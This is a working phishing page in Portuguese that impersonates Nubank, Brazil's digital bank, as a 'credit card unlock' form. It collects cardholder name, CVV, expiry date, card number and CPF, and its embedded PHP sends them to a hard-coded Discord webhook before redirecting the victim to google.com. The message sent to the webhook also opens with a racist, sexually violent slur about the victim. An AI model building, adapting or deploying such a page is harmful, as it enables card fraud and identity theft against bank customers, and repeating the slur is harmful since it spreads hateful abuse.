<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Desbloqueio de Cartão de Crédito</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f5f5f5;
            margin: 0;
        }
        .container {
            width: 100%;
            max-width: 500px;
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .logo img {
            width: 150px;
            margin-bottom: 20px;
        }
        form {
            display: flex;
            flex-direction: column;
        }
        input {
            margin: 10px 0;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ddd;
            border-radius: 4px;
            width: 100%;
        }
        button {
            padding: 10px;
            font-size: 16px;
            background-color: #8a2be2; /* Cor roxa do Nubank */
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:disabled {
            background-color: #ccc;
        }
        .error {
            color: red;
            font-size: 14px;
            margin-top: -10px;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://cdn.discordapp.com/attachments/901903878428168263/1280393817530437662/272px-Nubank_logo.png?ex=66d893ea&is=66d7426a&hm=c4e8c864638b2b16f186d19e2300bea4bd6fc1776275f428cfd06b9a778e82d0&" alt="Logo Nubank">
        </div>
        <h1>Desbloqueio do Cartão de Crédito</h1>
        <form action="index.php" method="post">
            <input type="text" name="cardName" placeholder="Nome impresso no cartão" maxlength="30" required>
            <input type="text" name="cardCVV" placeholder="CVV" maxlength="3" required>
            <input type="text" name="cardExpiry" placeholder="Data de vencimento (ex: 99/99)" maxlength="5" required>
            <input type="text" name="cardNumber" placeholder="Número do cartão" maxlength="19" required>
            <input type="text" name="cardCPF" placeholder="CPF (ex: 123.456.789-00)" maxlength="14" required>
            <button type="submit">Enviar</button>
            <div class="error">
                <?php
                if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                    // Coleta os dados do formulário
                    $cardName = $_POST['cardName'] ?? '';
                    $cardCVV = $_POST['cardCVV'] ?? '';
                    $cardExpiry = $_POST['cardExpiry'] ?? '';
                    $cardNumber = $_POST['cardNumber'] ?? '';
                    $cardCPF = $_POST['cardCPF'] ?? '';

                    // Função para formatar o número do cartão
                    function formatCardNumber($value) {
                        return preg_replace('/\D/', '', $value); // Remove caracteres não numéricos
                    }

                    // Função para formatar a data de vencimento
                    function formatExpiryDate($value) {
                        return preg_replace('/\D/', '', $value); // Remove caracteres não numéricos
                    }

                    // Função para formatar o CPF
                    function formatCPF($value) {
                        return preg_replace('/\D/', '', $value); // Remove caracteres não numéricos
                    }

                    // Função de validação
                    function validateInputs($name, $cvv, $expiry, $number, $cpf) {
                        $namePattern = '/^[A-Za-z\s]+$/';
                        $cvvPattern = '/^\d{3}$/';
                        $expiryPattern = '/^\d{2}\/\d{2}$/';
                        $numberPattern = '/^\d{4} \d{4} \d{4} \d{4}$/';
                        $cpfPattern = '/^\d{3}\.\d{3}\.\d{3}-\d{2}$/';

                        return preg_match($namePattern, $name) &&
                               preg_match($cvvPattern, $cvv) &&
                               preg_match($expiryPattern, $expiry) &&
                               preg_match($numberPattern, $number) &&
                               preg_match($cpfPattern, $cpf);
                    }

                    // Verifica e formata os dados
                    if (validateInputs($cardName, $cardCVV, $cardExpiry, $cardNumber, $cardCPF)) {
                        // Dados formatados
                        $formattedCardNumber = formatCardNumber($cardNumber);
                        $formattedExpiryDate = formatExpiryDate($cardExpiry);
                        $formattedCPF = formatCPF($cardCPF);

                        // URL do webhook do Discord
                        $webhookUrl = 'https://discord.com/api/webhooks/1280591985606000752/e07H_mTvlBmRneUljxu3JY3-VJg5649RFYhc8CBa5zYkpkJKEPCb0QFJsYKHRpkcAKUM';

                        // Enviar os dados para o webhook usando cURL
                        $ch = curl_init($webhookUrl);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                        curl_setopt($ch, CURLOPT_POST, true);
                        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
                        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode([
                            'content' => "Algum macaco preto estuprado caiu:\n\nNome: $cardName\nCVV: $cardCVV\nData de vencimento: $formattedExpiryDate\nNúmero do cartão: $formattedCardNumber\nCPF: $formattedCPF"
                        ]));

                        $response = curl_exec($ch);
                        curl_close($ch);

                        if ($response !== false) {
                            echo 'Dados enviados com sucesso!';
                            echo '<script>window.location.href = "https://www.google.com";</script>';
                        } else {
                            echo 'Erro ao enviar os dados.';
                        }
                    } else {
                        echo 'Preencha todos os campos corretamente.';
                    }
                }
                ?>
            </div>
        </form>
    </div>
</body>
</html>
